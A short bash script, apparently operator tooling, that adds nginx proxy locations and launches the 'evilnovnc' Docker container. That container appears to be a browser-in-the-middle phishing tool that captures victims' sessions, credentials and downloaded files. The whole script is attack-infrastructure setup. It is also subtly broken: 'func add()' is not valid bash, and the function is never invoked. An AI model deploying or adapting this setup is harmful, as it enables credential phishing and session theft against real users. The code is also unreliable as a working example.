#!/bin/bash

default_file=$1

func add()  {
    new_location=$1
    echo -e "location /${new_location}{\n  proxy_pass http://192.168.246.131:8080/sample;\n}" >> $default_file
    sudo docker cp $default_file nginx-base:/etc/nginx/conf.d/default.conf
    sudo docker run -d --rm -p 5980:5980 -v "${PWD}/Downloads":"/home/user/Downloads" -e FOLDER=$FOLDER -e RESOLUTION=$RESOLUTION -e WEBPAGE=$WEBPAGE --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
}